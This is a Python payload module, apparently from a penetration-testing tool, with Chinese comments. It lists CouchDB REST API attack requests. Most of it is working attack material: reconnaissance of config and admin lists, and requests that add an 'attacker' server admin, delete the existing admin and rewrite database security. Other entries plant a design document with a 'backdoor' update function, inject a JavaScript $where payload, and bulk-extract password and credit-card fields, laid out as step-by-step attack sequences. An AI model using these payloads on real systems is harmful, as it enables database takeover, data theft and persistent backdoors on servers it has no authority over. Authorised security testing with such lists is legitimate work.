"""
CouchDB注入载荷模块
包含用于CouchDB REST API注入的各种类型载荷
"""

# CouchDB 基本信息获取载荷
BASIC_INFO_PAYLOADS = [
    # 基本服务器信息
    "GET /",
    "GET /_all_dbs",
    "GET /_active_tasks",
    "GET /_stats",
    "GET /_node/nonode@nohost/_stats",
    "GET /_node/_local/_stats",
    "GET /_scheduler/jobs",
    "GET /_scheduler/docs",
    "GET /_membership",
    "GET /_up",
    "GET /_cluster_setup",
    
    # 版本信息
    "GET /_utils",
    "GET /_utils/dashboard.assets/version.js",
    
    # 配置信息
    "GET /_node/nonode@nohost/_config",
    "GET /_node/_local/_config",
    "GET /_node/nonode@nohost/_config/couch_httpd_auth",
    "GET /_node/_local/_config/couch_httpd_auth",
    "GET /_node/nonode@nohost/_config/admins",
    "GET /_node/_local/_config/admins",
]

# CouchDB 数据库操作载荷
DATABASE_OPERATIONS_PAYLOADS = [
    # 列出所有数据库
    "GET /_all_dbs",
    
    # 创建数据库
    "PUT /{db_name}",
    
    # 获取数据库信息
    "GET /{db_name}",
    "GET /{db_name}/_all_docs",
    "GET /{db_name}/_all_docs?include_docs=true",
    "GET /{db_name}/_design_docs",
    "GET /{db_name}/_changes",
    "GET /{db_name}/_security",
    
    # 删除数据库
    "DELETE /{db_name}",
    
    # 压缩数据库
    "POST /{db_name}/_compact",
    "POST /{db_name}/_view_cleanup",
    
    # 批量操作
    "POST /{db_name}/_bulk_docs",
    "POST /{db_name}/_bulk_get",
]

# CouchDB 文档操作载荷
DOCUMENT_OPERATIONS_PAYLOADS = [
    # 创建/更新文档
    "PUT /{db_name}/{doc_id}",
    "POST /{db_name}",
    
    # 获取文档
    "GET /{db_name}/{doc_id}",
    "GET /{db_name}/{doc_id}?attachments=true",
    "GET /{db_name}/{doc_id}?rev={rev}",
    
    # 删除文档
    "DELETE /{db_name}/{doc_id}",
    "DELETE /{db_name}/{doc_id}?rev={rev}",
    
    # 文档附件
    "PUT /{db_name}/{doc_id}/{attachment}",
    "GET /{db_name}/{doc_id}/{attachment}",
    "DELETE /{db_name}/{doc_id}/{attachment}",
]

# CouchDB 视图查询载荷
VIEW_QUERY_PAYLOADS = [
    # 视图设计文档
    "GET /{db_name}/_design/{design_doc}",
    "PUT /{db_name}/_design/{design_doc}",
    "DELETE /{db_name}/_design/{design_doc}",
    
    # 视图查询
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}",
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?include_docs=true",
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?key=\"{key}\"",
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?startkey=\"{startkey}\"&endkey=\"{endkey}\"",
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?limit={limit}&skip={skip}",
    "GET /{db_name}/_design/{design_doc}/_view/{view_name}?group=true",
    
    # 临时视图
    "POST /{db_name}/_temp_view",
    
    # MapReduce查询
    "POST /{db_name}/_find",
    "POST /{db_name}/_explain",
]

# CouchDB 用户认证载荷
AUTH_PAYLOADS = [
    # 基本认证
    "GET /_session",
    "POST /_session",
    "DELETE /_session",
    
    # 用户创建和管理
    "GET /_users/_all_docs",
    "GET /_users/org.couchdb.user:{username}",
    "PUT /_users/org.couchdb.user:{username}",
    "DELETE /_users/org.couchdb.user:{username}",
    
    # 基于Cookie的认证
    "POST /_session",
    "GET /_session",
    
    # 修改密码
    "PUT /_node/nonode@nohost/_config/admins/{username}",
    "DELETE /_node/nonode@nohost/_config/admins/{username}",
]

# CouchDB 注入攻击载荷
INJECTION_ATTACK_PAYLOADS = [
    # 服务器信息泄露
    "GET /_all_dbs",
    "GET /_utils",
    "GET /_node/_local/_config/admins",
    "GET /_node/nonode@nohost/_config",
    "GET /_node/_local/_config",
    "GET /_utils/dashboard.assets/version.js",
    
    # 权限绕过
    "PUT /{db_name}/_security",  # 尝试修改数据库安全配置
    "PUT /_users/org.couchdb.user:admin",  # 尝试创建管理员用户
    "PUT /_node/_local/_config/admins/admin",  # 尝试创建服务器管理员
    
    # 文档枚举
    "GET /{db_name}/_all_docs?include_docs=true",
    "GET /{db_name}/_design_docs?include_docs=true",
    "GET /{db_name}/_changes?include_docs=true",
    
    # 视图注入
    {
        "method": "PUT", 
        "url": "/{db_name}/_design/exploit", 
        "body": {
            "views": {
                "exploit": {
                    "map": "function(doc) { emit(doc._id, doc); }"
                }
            }
        }
    },
    {
        "method": "POST", 
        "url": "/{db_name}/_temp_view", 
        "body": {
            "map": "function(doc) { emit(null, doc); }"
        }
    }
]

# CouchDB JSON参数注入载荷
JSON_PARAMETER_INJECTION_PAYLOADS = [
    # 命令查询注入
    {
        "path": "/_find",
        "payload": {
            "selector": {
                "$where": "function() { sleep(5000); return true; }"
            }
        },
        "description": "在Mango查询中尝试注入JavaScript"
    },
    {
        "path": "/_find",
        "payload": {
            "selector": {
                "_id": {
                    "$regex": "^admin"
                }
            }
        },
        "description": "使用正则表达式查找管理员文档"
    },
    {
        "path": "/_find",
        "payload": {
            "selector": {
                "password": {
                    "$exists": true
                }
            }
        },
        "description": "查找包含密码字段的所有文档"
    },
    {
        "path": "/_find",
        "payload": {
            "selector": {},
            "fields": ["_id", "username", "password", "email", "credit_card"],
            "limit": 1000
        },
        "description": "尝试提取敏感字段"
    },
    
    # 设计文档注入
    {
        "path": "/{db_name}/_design/exploit",
        "method": "PUT",
        "payload": {
            "views": {
                "all": {
                    "map": "function(doc) { emit(doc._id, doc); }"
                }
            },
            "filters": {
                "important": "function(doc, req) { return true; }"
            },
            "updates": {
                "updateField": "function(doc, req) { doc.updated_by = 'attacker'; return [doc, 'Updated!'] }"
            },
            "validate_doc_update": "function(newDoc, oldDoc, userCtx) { if (userCtx.roles.indexOf('_admin') === -1) { throw({forbidden: 'Not authorized'}); } }"
        },
        "description": "创建恶意设计文档"
    }
]

# CouchDB 完整的REST API注入序列
ATTACK_SEQUENCES = [
    # 信息收集序列
    {
        "name": "服务器信息收集",
        "steps": [
            {"method": "GET", "path": "/", "description": "获取CouchDB基本信息"},
            {"method": "GET", "path": "/_all_dbs", "description": "获取所有数据库列表"},
            {"method": "GET", "path": "/_node/_local/_config", "description": "尝试获取配置信息"},
            {"method": "GET", "path": "/_utils", "description": "访问Fauxton界面"},
            {"method": "GET", "path": "/_active_tasks", "description": "查看活动任务"}
        ]
    },
    
    # 用户枚举序列
    {
        "name": "用户枚举与提升权限",
        "steps": [
            {"method": "GET", "path": "/_users/_all_docs?include_docs=true", "description": "获取所有用户信息"},
            {"method": "GET", "path": "/_users/org.couchdb.user:admin", "description": "尝试获取admin用户信息"},
            {"method": "PUT", "path": "/_users/org.couchdb.user:attacker", "body": {
                "name": "attacker",
                "password": "attackerpass",
                "roles": ["_admin"],
                "type": "user"
            }, "description": "尝试创建管理员用户"}
        ]
    },
    
    # 数据库操作序列
    {
        "name": "数据库提取序列",
        "steps": [
            {"method": "GET", "path": "/_all_dbs", "description": "获取所有数据库"},
            {"method": "GET", "path": "/users", "description": "访问用户数据库"},
            {"method": "GET", "path": "/users/_all_docs?include_docs=true", "description": "获取所有用户文档"},
            {"method": "GET", "path": "/config", "description": "尝试访问配置数据库"},
            {"method": "GET", "path": "/logs", "description": "尝试访问日志数据库"}
        ]
    },
    
    # 攻击序列: 设计文档注入
    {
        "name": "设计文档注入",
        "steps": [
            {"method": "PUT", "path": "/target_db/_design/malicious", "body": {
                "views": {
                    "all_data": {
                        "map": "function(doc) { emit(null, doc); }"
                    }
                },
                "updates": {
                    "backdoor": "function(doc, req) { doc.backdoor = 'enabled'; return [doc, 'Backdoor enabled']; }"
                }
            }, "description": "创建恶意设计文档"},
            {"method": "GET", "path": "/target_db/_design/malicious/_view/all_data", "description": "获取所有数据"},
            {"method": "POST", "path": "/target_db/_design/malicious/_update/backdoor/target_doc", "description": "修改目标文档添加后门"}
        ]
    }
]

# CouchDB 权限提升载荷
PRIVILEGE_ESCALATION_PAYLOADS = [
    # 修改配置
    {
        "method": "PUT",
        "path": "/_node/nonode@nohost/_config/admins/attacker",
        "body": "\"attackerpass\"",
        "description": "添加新管理员用户"
    },
    {
        "method": "DELETE",
        "path": "/_node/nonode@nohost/_config/admins/admin",
        "description": "删除现有管理员"
    },
    
    # 创建管理员用户
    {
        "method": "PUT",
        "path": "/_users/org.couchdb.user:attacker",
        "body": {
            "name": "attacker",
            "password": "attackerpass",
            "roles": ["_admin"],
            "type": "user"
        },
        "description": "创建具有管理员权限的用户"
    },
    
    # 修改安全配置
    {
        "method": "PUT",
        "path": "/{db_name}/_security",
        "body": {
            "admins": {
                "names": ["attacker"],
                "roles": []
            },
            "members": {
                "names": [],
                "roles": []
            }
        },
        "description": "将攻击者添加为数据库管理员"
    }
] 